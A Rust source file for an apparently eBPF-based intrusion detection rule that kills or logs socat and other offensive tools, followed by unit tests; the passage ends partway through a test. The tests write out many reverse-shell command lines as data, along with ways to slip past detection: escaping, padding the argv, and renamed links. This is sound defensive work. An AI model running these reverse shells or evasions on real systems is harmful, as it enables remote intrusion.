//! R006 — Known offensive security tooling.
//!
//! External audit PROC-010: the rule killed every exec named `socat`,
//! `/usr/bin/socat` from the distribution included — a relay that
//! virtualisation consoles, port-forwarding and test harnesses run — and an
//! operator had no allowlist to stop it. Now:
//!
//! - the process allowlist applies, judged on what the kernel executed;
//! - a `socat` the distribution installed — its executable in `/usr/bin`,
//!   `/bin`, `/usr/sbin` or `/sbin` — is recorded (Log, High), unless one
//!   of its addresses runs a shell (`EXEC:`, `SYSTEM:` or `SHELL:` with
//!   `sh`, `bash`…), the reverse- or bind-shell shape, which is still
//!   killed;
//! - a `socat` from anywhere else, and the other tools (no distribution
//!   ships them on a server), are still killed.
//!
//! Lab PR 166: a kill takes the tree. The shell that `socat EXEC:` runs is
//! its child, and a copied tool is the payload itself.
//!
//! External audit EBPF-021: the exec record keeps the first 511 bytes of
//! the command line, and filler options (`-d` repeated) pushed the shell
//! address past them: the distribution's socat then read as a plain relay.
//! When the kernel marks the argv as cut (or unread) and the part kept
//! runs no shell, the rule does not conclude that none does: the exec is
//! recorded at the severity of one that does (Log, Critical), the cut
//! named, instead of the relay's High record.
//!
//! Lot 313 (external bug hunt, edition 1.4: BUG-112, BUG-119): one reader
//! of socat's addresses ([`address_runs_a_shell`]). A dual address
//! (`STDIO!!EXEC:/bin/sh`) holds two addresses in one argument, and a chain
//! (socat 1.8: `a|b`) several: each is read. `SYSTEM:` and `SHELL:` run
//! their command with `/bin/sh -c` (or `$SHELL`): a shell, whatever the
//! command. `EXEC:` runs its program directly: the program is read past the
//! launchers in front of it (`env`, `setsid`, `nohup`, `stdbuf`, `timeout`,
//! `nice`, `ionice`, `chrt`, `taskset`, `sudo`, `doas`, busybox), and a
//! shell, `script` (which starts one), or an interpreter running inline
//! code or its standard input (`python3 -c 'import pty;pty.spawn(…)'`, a
//! REPL; read by the interpreters' one reader) is a shell. The place of
//! the distribution's socat is the kernel's executed file, never the
//! caller's string (BUG-119: a string cut at 255 bytes named
//! `/usr/bin/./././…`); not known, it is no distribution's. And the tool is
//! named by its `comm` or by the kernel's executed file: a link to
//! `/usr/bin/socat` under another name is socat.
//!
//! Names are chosen by whoever runs the binary; a renamed copy of a tool
//! evades this rule, which the network and staging rules back up.

use std::sync::Arc;

use nn_model::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::attack::{AttackRef, Tactic};
use crate::decision::rules::program_identity;
use crate::decision::{rules::build_verdict, Rule};
use crate::posture::host::PostureHost;

const OFFSEC_COMMS: &[&str] = &["socat", "msfvenom", "meterpreter", "sliver", "havoc"];

/// Where a distribution installs socat. Not the other system trees: a
/// webroot under `/usr/share` is R010's, and a build in `/usr/local` or
/// `/opt` is the operator's to allowlist.
const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"];

pub struct R006ReverseShellTooling<H: PostureHost> {
    allowlist: Arc<CommAllowlist<H>>,
    /// Lot 313 (the review of #549, F2): the lineage, to judge the shell
    /// socat starts (`None`: unit tests of the address reader only).
    lineage: Option<crate::posture::lineage::AuthSessionTracker<H>>,
}

impl<H: PostureHost> R006ReverseShellTooling<H> {
    pub fn new(allowlist: Arc<CommAllowlist<H>>) -> Self {
        Self {
            allowlist,
            lineage: None,
        }
    }

    /// Lot 313: this rule judging the shells socat starts too.
    pub fn with_lineage(
        mut self,
        lineage: Option<crate::posture::lineage::AuthSessionTracker<H>>,
    ) -> Self {
        self.lineage = lineage;
        self
    }

    /// Lot 313 (the review of #549, F2): `event` executes a shell or an
    /// interpreter (by identity: [`program_identity::shell_or_interpreter`])
    /// whose parent is socat, or which socat started through launchers
    /// (`sudo -i`, `su -`, `script`, at most three hops): the shell an
    /// address ran, whatever its spelling. socat's pid and executable.
    fn started_by_socat(&self, event: &Event) -> Option<(u32, String)> {
        let lineage = self.lineage.as_ref()?;
        program_identity::shell_or_interpreter(event)?;
        let Event::ProcessSpawn { pid, ppid, .. } = event else {
            return None;
        };
        let as_of = crate::posture::lineage::AsOf::of_event(event);
        let socat =
            |exe: &str| program_identity::program_is(program_identity::base_of(exe), "socat");
        let parent = lineage.exec_identity(*ppid, as_of)?;
        let parent_exe = parent.exe.to_string_lossy().into_owned();
        if socat(&parent_exe) {
            return Some((*ppid, parent_exe));
        }
        if !program_identity::names_a_launcher(&parent_exe) {
            return None;
        }
        let hops = lineage.lineage_identities(*pid, as_of)?;
        for (p, id) in hops.iter().skip(2).take(2) {
            let exe = id.exe.to_string_lossy().into_owned();
            if socat(&exe) {
                return Some((*p, exe));
            }
            if !program_identity::names_a_launcher(&exe) {
                return None;
            }
        }
        None
    }
}

/// Lot 313 (the review of #549, F2): an argument as socat's lexer reads it —
/// a `\` keeps the next character, `'…'` and `"…"` are dropped around
/// their content (`EX"EC":/bin/s\h` is `EXEC:/bin/sh`) — each character
/// with whether it was quoted or escaped (no separator then).
fn socat_lexed(arg: &str) -> Vec<(char, bool)> {
    let mut out = Vec::with_capacity(arg.len());
    let mut chars = arg.chars();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        match (quote, c) {
            (None | Some('"'), '\\') => {
                if let Some(n) = chars.next() {
                    out.push((n, true));
                }
            }
            (None, '\'' | '"') => quote = Some(c),
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => out.push((c, true)),
            (None, c) => out.push((c, false)),
        }
    }
    out
}

/// `lexed` cut at each unquoted occurrence of `sep`.
fn split_lexed<'a>(lexed: &'a [(char, bool)], sep: &[char]) -> Vec<&'a [(char, bool)]> {
    let mut parts = Vec::new();
    let mut from = 0;
    let mut i = 0;
    while i < lexed.len() {
        let here = lexed[i..].iter().map(|(c, _)| *c);
        if lexed[i..].len() >= sep.len()
            && here.take(sep.len()).eq(sep.iter().copied())
            && lexed[i..i + sep.len()].iter().all(|(_, q)| !q)
        {
            parts.push(&lexed[from..i]);
            i += sep.len();
            from = i;
        } else {
            i += 1;
        }
    }
    parts.push(&lexed[from..]);
    parts
}

fn text(lexed: &[(char, bool)]) -> String {
    lexed.iter().map(|(c, _)| *c).collect()
}

/// Lot 313 (BUG-112): socat's addresses in `argv` — every argument after
/// the program's name, read by socat's lexer ([`socat_lexed`]), a dual
/// address (`a!!b`) split in two and a chain (`a|b`) in its links, where
/// the separator is not quoted.
fn addresses(argv: &[String]) -> Vec<Vec<(char, bool)>> {
    argv.iter()
        .skip(1)
        .flat_map(|a| {
            let lexed = socat_lexed(a);
            split_lexed(&lexed, &['!', '!'])
                .into_iter()
                .flat_map(|d| split_lexed(d, &['|']))
                .map(<[(char, bool)]>::to_vec)
                .collect::<Vec<_>>()
        })
        .collect()
}

/// One socat address runs a shell (module docs): `SYSTEM:` and `SHELL:`
/// always; `EXEC:` when its command line does
/// ([`program_identity::command_runs_a_shell`]). The address type in any
/// case; the command line up to socat's first `,` (its options).
fn address_runs_a_shell(address: &[(char, bool)]) -> bool {
    let start = address
        .iter()
        .position(|(c, q)| *q || !c.is_whitespace())
        .unwrap_or(address.len());
    let address = &address[start..];
    let mut parts = split_lexed(address, &[':']).into_iter();
    let kind = text(parts.next().unwrap_or(&[]));
    let rest: Vec<(char, bool)> = {
        let colon = address
            .iter()
            .position(|(c, q)| *c == ':' && !q)
            .map_or(address.len(), |i| i + 1);
        address[colon..].to_vec()
    };
    if colon_free(address) {
        return false;
    }
    match kind.to_ascii_lowercase().as_str() {
        "system" | "shell" => true,
        "exec" => {
            // the command line, up to socat's first unquoted `,` (its
            // options), in words cut at whitespace (socat splits the
            // command it unquoted: `EXEC:'/bin/sh -i'` runs `/bin/sh -i`)
            let command = split_lexed(&rest, &[',']).into_iter().next().unwrap_or(&[]);
            let mut words: Vec<String> = Vec::new();
            let mut word = String::new();
            for (c, _) in command {
                if c.is_whitespace() {
                    if !word.is_empty() {
                        words.push(std::mem::take(&mut word));
                    }
                } else {
                    word.push(*c);
                }
            }
            if !word.is_empty() {
                words.push(word);
            }
            program_identity::command_runs_a_shell(&words)
        }
        _ => false,
    }
}

/// `address` holds no unquoted `:` (no address type).
fn colon_free(address: &[(char, bool)]) -> bool {
    !address.iter().any(|(c, q)| *c == ':' && !q)
}

/// The first socat address in `argv` that runs a shell
/// ([`address_runs_a_shell`]), as socat reads it (for the record).
fn socat_shell_address(argv: &[String]) -> Option<String> {
    addresses(argv)
        .into_iter()
        .find(|a| address_runs_a_shell(a))
        .map(|a| text(&a))
}

impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
    fn id(&self) -> &'static str {
        "R006_ReverseShellTooling"
    }
    fn name(&self) -> &'static str {
        "Reverse shell tooling"
    }
    fn category(&self) -> &'static str {
        "lateral_movement"
    }
    fn attack(&self) -> &'static [AttackRef] {
        const ATTACK: &[AttackRef] = &[
            AttackRef::new(Tactic::CommandAndControl, "T1095"),
            AttackRef::new(Tactic::Execution, "T1059.004"),
        ];
        ATTACK
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            exe,
            argv,
            ..
        } = event
        else {
            return None;
        };
        let Some(tool) = program_identity::tool_named(event, OFFSEC_COMMS) else {
            // lot 313 (the review of #549, F2): the shell socat started,
            // by its identity — whatever its address's spelling
            let (socat_pid, socat_exe) = self.started_by_socat(event)?;
            let Event::ProcessSpawn { filename, exe, .. } = event else {
                return None;
            };
            let image = exe.path_or(filename);
            return Some(build_verdict(
                self,
                event,
                ResponseAction::KillProcessTree,
                Severity::Critical,
                &format!(
                    "{image} is a shell or an interpreter started by socat ({socat_exe}, pid \
                     {socat_pid}) — what one of its addresses ran, whatever its spelling: the \
                     reverse- or bind-shell shape (T1059.004 over T1095); kill the process \
                     tree"
                ),
            ));
        };
        let judgement = super::judge_spawn(&self.allowlist, event);
        if judgement == Judgement::Allowed {
            return None;
        }
        let image = exe.path_or(filename);
        // lot 313 (BUG-119): the kernel's executed file, never the caller's
        // string
        let distribution = program_identity::kernel_image(event).is_some_and(|k| {
            crate::posture::lineage::in_system_tree(k)
                && DISTRIBUTION_BIN_DIRS.iter().any(|d| k.starts_with(d))
        });
        let cut = super::argv_cut_note(event);
        let shell_address = (tool == "socat")
            .then(|| socat_shell_address(argv))
            .flatten();
        let verdict = if tool == "socat" && distribution && shell_address.is_none() {
            match cut {
                // External audit EBPF-021: no shell in the part kept is not
                // "no shell".
                Some(note) => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::Critical,
                    &format!(
                        "socat installed by the distribution ({image}) — not \
                         classified: {note}; an address past the cut may run a \
                         shell (EXEC:/SYSTEM:/SHELL:), so it is recorded at the \
                         severity of one that does, not as a relay"
                    ),
                ),
                None => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::High,
                    &format!(
                        "socat installed by the distribution ({image}) — recorded, not \
                         killed: the relay has legitimate uses; one running a shell \
                         (EXEC:/SYSTEM:/SHELL:) is killed"
                    ),
                ),
            }
        } else {
            build_verdict(
                self,
                event,
                ResponseAction::KillProcessTree,
                Severity::Critical,
                &super::with_argv_cut_note(
                    match &shell_address {
                        // lot 313: the address as socat reads it
                        Some(address) => format!(
                            "Known offensive security tooling detected: socat's address \
                             `{address}` runs a shell"
                        ),
                        None => "Known offensive security tooling detected".to_string(),
                    },
                    event,
                ),
            )
        };
        Some(judgement.apply(verdict, comm))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // R08b (lab PR 251): on the portable test host.
    use crate::posture::host::testing::TestHost as H;
    type CommAllowlist = crate::config::comm_allowlist::CommAllowlist<H>;
    type R006ReverseShellTooling = super::R006ReverseShellTooling<H>;
    use crate::decision::rules::testutil::{argv_cut, kernel_exe, spawn, spawn_exe};

    /// Lot 313 (BUG-119): an exec of `filename` as the LSM hook reports it
    /// — the distribution's socat is placed by the kernel's path only.
    fn spawn_full(comm: &str, filename: &str, uid: u32, argv: &[&str], parent_comm: &str) -> Event {
        kernel_exe(crate::decision::rules::testutil::spawn_full(
            comm,
            filename,
            uid,
            argv,
            parent_comm,
        ))
    }

    fn rule() -> R006ReverseShellTooling {
        R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
    }

    #[test]
    fn fires_on_each_offsec_tool() {
        for comm in OFFSEC_COMMS {
            let v = rule()
                .evaluate(&spawn(comm, "/home/alice/whatever"))
                .unwrap_or_else(|| panic!("should fire on {comm}"));
            assert_eq!(v.action, ResponseAction::KillProcessTree);
            assert_eq!(v.severity, Severity::Critical);
        }
    }

    /// Lab PR 166: the shell a system socat runs, and a copied tool's
    /// children, die with it.
    #[test]
    fn r006_kills_the_process_tree() {
        let shell = spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:127.0.0.1:9", "EXEC:/bin/sh"],
            "bash",
        );
        for e in [shell, spawn_exe("socat", "socat", "/tmp/socat", 0)] {
            let v = rule().evaluate(&e).expect("fires");
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{e:?}");
        }
    }

    #[test]
    fn ignores_benign_tools() {
        assert!(rule().evaluate(&spawn("ssh", "/usr/bin/ssh")).is_none());
    }

    #[test]
    fn match_is_exact_not_prefix() {
        assert!(rule()
            .evaluate(&spawn("socat-helper", "/usr/bin/socat-helper"))
            .is_none());
    }

    /// External audit PROC-010: the distribution's socat is recorded; a
    /// copy anywhere else, and the other tools from anywhere, are killed.
    #[test]
    fn r006_system_socat_is_recorded_a_copy_is_killed() {
        let v = rule()
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .unwrap();
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::High);
        for (comm, path) in [
            ("socat", "/home/alice/socat"),
            ("socat", "/usr/bin/../../tmp/socat"),
            ("socat", "/usr/share/nginx/html/socat"),
            ("socat", "/opt/tools/socat"),
            ("msfvenom", "/usr/bin/msfvenom"),
        ] {
            let v = rule().evaluate(&spawn_exe(comm, comm, path, 0)).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{path}");
            assert_eq!(v.severity, Severity::Critical, "{path}");
        }
    }

    /// External audit PROC-010: a system socat that runs a shell is the
    /// reverse- or bind-shell shape, and is killed.
    #[test]
    fn r006_system_socat_running_a_shell_is_killed() {
        for args in [
            &[
                "socat",
                "TCP:10.0.0.9:4444",
                "EXEC:/bin/sh,pty,stderr,setsid",
            ][..],
            &["socat", "tcp-listen:9001,fork", "exec:bash -li"][..],
            &["socat", "-d", "TCP:h:1", "SYSTEM:'sh -i'"][..],
            &["socat", "TCP:h:1", "SHELL:zsh"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{args:?}");
        }
        for args in [
            &[
                "socat",
                "UNIX-CONNECT:/run/qemu/serial0",
                "STDIO,raw,echo=0",
            ][..],
            &["socat", "TCP-LISTEN:8080,fork", "TCP:127.0.0.1:80"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::Log, "{args:?}");
        }
    }

    /// External audit EBPF-021: filler options push the shell address past
    /// the 511 bytes the kernel keeps. A cut argv whose kept part runs no
    /// shell is not a relay: recorded at Critical, the cut named. A whole
    /// argv keeps the relay's High record; a shell in the kept part is
    /// still killed; a copy is still killed, the cut named.
    #[test]
    fn r006_socat_with_truncated_argv_is_logged() {
        let mut args = vec!["socat"];
        args.extend(std::iter::repeat_n("-d", 200));
        args.push("TCP:127.0.0.1:9");
        let padded = argv_cut(spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash"));
        let v = rule().evaluate(&padded).expect("fires");
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::Critical);
        assert!(
            v.reasoning.contains("argv truncated at 511 bytes"),
            "{}",
            v.reasoning
        );
        assert!(v.reasoning.contains("not classified"), "{}", v.reasoning);

        // Unread argv: the same, named as unread.
        let unread = argv_cut(spawn_exe("socat", "/usr/bin/socat", "/usr/bin/socat", 0));
        let v = rule().evaluate(&unread).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::Critical)
        );
        assert!(v.reasoning.contains("argv not read"), "{}", v.reasoning);

        // The same argv, whole: the relay's record.
        let whole = spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash");
        let v = rule().evaluate(&whole).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::High)
        );

        // A shell in the part kept: killed, cut or not.
        let shell = argv_cut(spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "EXEC:/bin/sh"],
            "bash",
        ));
        let v = rule().evaluate(&shell).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("argv truncated"), "{}", v.reasoning);

        // A copy: killed as before, the cut named.
        let copy = argv_cut(spawn_exe("socat", "socat", "/tmp/socat", 0));
        let v = rule().evaluate(&copy).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
    }

    /// External audit PROC-010: an operator allowlist, judged on what the
    /// kernel executed: the installed socat is exempt, a copy is not.
    #[test]
    fn r006_allowlisted_by_identity_is_exempt() {
        let r = R006ReverseShellTooling::new(Arc::new(CommAllowlist::from_iter_owned([
            "socat".to_string()
        ])));
        assert!(r
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .is_none());
        let v = r
            .evaluate(&spawn_exe("socat", "./socat", "/home/alice/socat", 0))
            .expect("a copy is not the allowlisted socat");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("named 'socat'"), "{}", v.reasoning);
    }
}

/// Lot 313 (external bug hunt, edition 1.4: BUG-112): a socat dual address
/// (`read!!write`) holds two addresses in one argument;
/// `socat_runs_a_shell` matched `EXEC:`/`SYSTEM:`/`SHELL:` only at the
/// start of the argument, and the program as the first word after it.
#[cfg(test)]
mod bug112 {
    use super::*;
    use crate::decision::rules::testutil::{kernel_exe, spawn_exe, spawn_full};
    use crate::posture::host::testing::TestHost as H;

    fn judged(args: &[&str]) -> (ResponseAction, Severity) {
        let e = kernel_exe(spawn_full("socat", "/usr/bin/socat", 1000, args, "bash"));
        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
            .evaluate(&e)
            .expect("fires");
        (v.action, v.severity)
    }

    fn not_killed(cases: &[&[&str]]) -> Vec<String> {
        cases
            .iter()
            .filter_map(|args| {
                let got = judged(args);
                (got != (ResponseAction::KillProcessTree, Severity::Critical))
                    .then(|| format!("{args:?} -> {got:?}"))
            })
            .collect()
    }

    #[test]
    fn bug112_dual_address_running_a_shell_is_killed() {
        let missed = not_killed(&[
            &["socat", "TCP:10.0.0.1:4444", "STDIO!!EXEC:/bin/sh"],
            &["socat", "TCP-LISTEN:4444,reuseaddr", "-!!exec:bash -li"],
            &["socat", "TCP:10.0.0.1:4444", "STDIN!!SHELL:zsh"],
        ]);
        assert!(
            missed.is_empty(),
            "distribution socat whose dual address runs a shell is not killed: {missed:?}"
        );
    }

    /// Beyond the report's fix (`split("!!")`): the shell was matched on
    /// the first word after `EXEC:`/`SYSTEM:` only — a launcher in front
    /// of it, or `SYSTEM:` (which always runs `/bin/sh -c`) with another
    /// first word, still read as a plain relay.
    #[test]
    fn bug112_other_shell_spellings_the_report_fix_still_misses() {
        let missed = not_killed(&[
            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/env sh"],
            &["socat", "TCP:10.0.0.1:4444", "SYSTEM:exec bash -i"],
            &["socat", "TCP:10.0.0.1:4444", "EXEC:/usr/bin/setsid bash -i"],
        ]);
        assert!(
            missed.is_empty(),
            "shell run through a launcher, not killed: {missed:?}"
        );
    }

    /// Lot 313's mini-hunt: more spellings of the same shape — a chain's
    /// link (socat 1.8), a launcher's options and operands, an interpreter
    /// running inline code or a REPL (`pty.spawn`), `script`, busybox, any
    /// case, `SYSTEM:` running anything.
    #[test]
    fn bug112_variants_are_killed() {
        let missed = not_killed(&[
            &["socat", "TCP:h:1", "OPENSSL:h:443|EXEC:/bin/sh"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:env -i PATH=/bin bash -i,pty,stderr",
            ],
            &["socat", "TCP:h:1", "EXEC:timeout -s KILL 3600 sh"],
            &["socat", "TCP:h:1", "EXEC:nohup stdbuf -o0 /bin/bash -i"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            ],
            &["socat", "TCP:h:1", "EXEC:perl -e 'exec \"/bin/sh\"'"],
            &["socat", "TCP:h:1", "EXEC:python3,pty"],
            &["socat", "TCP:h:1", "EXEC:script -qc /bin/bash /dev/null"],
            &["socat", "TCP:h:1", "EXEC:busybox sh"],
            &["socat", "TCP:h:1", "Exec:/bin/sh"],
            &["socat", "TCP:h:1", "SYSTEM:while read c; do $c; done"],
            &["socat", "TCP:h:1", "system:id"],
            // a space after the dual address's `!!` (read as socat may)
            &["socat", "TCP:h:1", "STDIO!! EXEC:/bin/sh"],
        ]);
        assert!(missed.is_empty(), "not killed: {missed:?}");
    }

    /// Guard: a dual relay without a shell stays the relay's record, and so
    /// does a program that runs no shell, through a launcher or not.
    #[test]
    fn bug112_guard_dual_relay_without_a_shell_is_recorded() {
        for args in [
            &["socat", "TCP:10.0.0.1:4444", "STDIO!!OPEN:/tmp/log,creat"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:nohup /usr/bin/tail -f /var/log/syslog",
            ],
            &["socat", "TCP:h:1", "EXEC:python3 /srv/relay/main.py"],
            &["socat", "TCP:h:1", "EXEC:busybox cat"],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::Log, Severity::High),
                "{args:?}"
            );
        }
    }

    /// Lot 313 (BUG-119 on R006): the distribution's socat is placed by the
    /// kernel's executed file; the caller's string — a cut one, or any one
    /// the kernel's path is not known for — places none: a copy's kill.
    #[test]
    fn bug119_a_socat_the_kernel_did_not_place_is_no_distribution_s() {
        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
        let mut cut = spawn_full(
            "socat",
            &format!("/usr/bin/{}", "./".repeat(123)),
            1000,
            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
            "bash",
        );
        if let Event::ProcessSpawn {
            filename_truncated, ..
        } = &mut cut
        {
            *filename_truncated = true;
        }
        let v = r.evaluate(&cut).expect("fires");
        assert_eq!(v.action, ResponseAction::KillProcessTree, "{}", v.reasoning);
        let caller_only = spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "TCP:127.0.0.1:80"],
            "bash",
        );
        let v = r.evaluate(&caller_only).expect("fires");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        // the kernel's path: the relay's record
        let v = r.evaluate(&kernel_exe(caller_only)).expect("fires");
        assert_eq!(v.action, ResponseAction::Log);
    }

    /// Lot 313's mini-hunt: a link to the distribution's socat under another
    /// name has its link's `comm`; the kernel executed socat, and R006
    /// judges it so — a shell it runs is killed, a relay recorded.
    #[test]
    fn a_link_to_socat_under_another_name_is_socat() {
        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()));
        let link = |args: &[&str]| {
            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat", 0);
            if let Event::ProcessSpawn { argv, .. } = &mut e {
                *argv = args.iter().map(|s| s.to_string()).collect();
            }
            r.evaluate(&e).map(|v| (v.action, v.severity))
        };
        assert_eq!(
            link(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
            Some((ResponseAction::KillProcessTree, Severity::Critical))
        );
        assert_eq!(
            link(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
            Some((ResponseAction::Log, Severity::High))
        );
        // the lab (12/11, Ubuntu 24.04 and Debian 13): socat 1.8's file is
        // `/usr/bin/socat1`; a link to it under another name ran its shell
        // with no record
        let socat1 = |args: &[&str]| {
            let mut e = spawn_exe("relay", "/home/u/relay", "/usr/bin/socat1", 0);
            if let Event::ProcessSpawn { argv, .. } = &mut e {
                *argv = args.iter().map(|s| s.to_string()).collect();
            }
            r.evaluate(&e).map(|v| (v.action, v.severity))
        };
        assert_eq!(
            socat1(&["relay", "TCP:h:1", "EXEC:/bin/sh"]),
            Some((ResponseAction::KillProcessTree, Severity::Critical))
        );
        assert_eq!(
            socat1(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
            Some((ResponseAction::Log, Severity::High))
        );
    }
}

/// Lot 313 (the review of #549, F2 and F6): socat's lexer, the shell its
/// address starts, and the launchers that start one.
#[cfg(test)]
mod review549 {
    use super::*;
    use crate::decision::rules::testutil::{kernel_exe, spawn_exe, spawn_full};
    use crate::posture::host::testing::TestHost as H;
    use crate::posture::lineage::AuthSessionTracker;

    fn argv(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    fn judged(args: &[&str]) -> (ResponseAction, Severity) {
        let e = kernel_exe(spawn_full("socat", "/usr/bin/socat", 1000, args, "bash"));
        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
            .evaluate(&e)
            .expect("fires");
        (v.action, v.severity)
    }

    /// F2: socat drops a `\` and the quotes anywhere in an address, the
    /// keyword included (socat 1.8.0.0, checked by the reviewer with
    /// `/bin/echo`); the reader read the raw text — a relay.
    #[test]
    fn review549_an_escaped_or_quoted_address_runs_its_shell() {
        for args in [
            &["socat", "TCP:h:1", "EXEC:/bin/s\\h"][..],
            &["socat", "TCP:h:1", "EXEC:/bin/'s'h"],
            &["socat", "TCP:h:1", "EXEC:/bin/s\"h\""],
            &["socat", "TCP:h:1", "EX\"EC\":/bin/sh"],
            &["socat", "TCP:h:1", "E\\XEC:/bin/sh"],
            &["socat", "TCP:h:1", "SY\\STEM:id"],
            // a quoted command line, its options after it
            &["socat", "TCP:h:1", "EXEC:'/bin/sh -i',pty"],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::KillProcessTree, Severity::Critical),
                "{args:?}"
            );
        }
        // the record names the address as socat reads it
        let e = kernel_exe(spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "EX\"EC\":/bin/s\\h,pty"],
            "bash",
        ));
        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
            .evaluate(&e)
            .unwrap();
        assert!(
            v.reasoning.contains("`EXEC:/bin/sh,pty`"),
            "{}",
            v.reasoning
        );
        // guards: a quoted `!!` or `|` is no separator, a quoted `:` no
        // address type; a relay stays one
        for args in [
            &["socat", "TCP:h:1", "OPEN:'/tmp/a!!EXEC:x'"][..],
            &["socat", "TCP:h:1", "OPEN:'/tmp/a!!SYSTEM:x'"],
            &["socat", "TCP:h:1", "OPEN:\"/tmp/a|SYSTEM:x\""],
            &["socat", "TCP:h:1", "OPEN:/tmp/a\\!\\!SYSTEM:x"],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::Log, Severity::High),
                "{args:?}"
            );
        }
    }

    /// F6 and F4 on the address: the launchers that start a shell given no
    /// program, `env -S`, busybox's own shells, the dynamic loader.
    #[test]
    fn review549_launchers_that_start_a_shell_are_read() {
        for args in [
            &["socat", "TCP:h:1", "EXEC:busybox hush -i"][..],
            &["socat", "TCP:h:1", "EXEC:env -S/bin/sh"],
            &["socat", "TCP:h:1", "EXEC:env -S '/bin/sh -i'"],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/env --split-string=sh"],
            &["socat", "TCP:h:1", "EXEC:sudo -i"],
            &["socat", "TCP:h:1", "EXEC:sudo -u root -s"],
            &["socat", "TCP:h:1", "EXEC:su -"],
            &["socat", "TCP:h:1", "EXEC:runuser -u x"],
            &["socat", "TCP:h:1", "EXEC:chroot /"],
            &["socat", "TCP:h:1", "EXEC:nsenter -t 1 -m"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:/lib64/ld-linux-x86-64.so.2 /bin/sh",
            ],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:/lib64/ld-linux-x86-64.so.2 --library-path /x --argv0 y /bin/bash -i",
            ],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::KillProcessTree, Severity::Critical),
                "{args:?}"
            );
        }
        for args in [
            &["socat", "TCP:h:1", "EXEC:chroot / /usr/bin/id"][..],
            &["socat", "TCP:h:1", "EXEC:busybox cat"],
            &[
                "socat",
                "TCP:h:1",
                "EXEC:/lib64/ld-linux-x86-64.so.2 /usr/bin/id",
            ],
            &["socat", "TCP:h:1", "EXEC:sudo -u root /usr/bin/id"],
        ] {
            assert_eq!(
                judged(args),
                (ResponseAction::Log, Severity::High),
                "{args:?}"
            );
        }
    }

    fn child(pid: u32, ppid: u32, exe: &str, a: &[&str], ts: u64) -> Event {
        let mut e = spawn_exe(a[0], exe, exe, 0);
        if let Event::ProcessSpawn {
            pid: p,
            ppid: pp,
            argv: v,
            timestamp_ns,
            start_ns,
            uid,
            ..
        } = &mut e
        {
            (*p, *pp, *uid) = (pid, ppid, 1000);
            *v = argv(a);
            (*timestamp_ns, *start_ns) = (ts, ts - 1);
        }
        e
    }

    /// F2 (a): the shell socat starts, by its identity, is the address's
    /// shell whatever its spelling — directly, or through a launcher that
    /// forks (`sudo -i`); an interpreter too (`EXEC:python3 /tmp/x.py`).
    /// Guards: a program socat starts that is no shell; a shell started by
    /// anything else.
    #[test]
    fn review549_the_shell_socat_starts_is_killed() {
        let dir = tempfile::tempdir().unwrap();
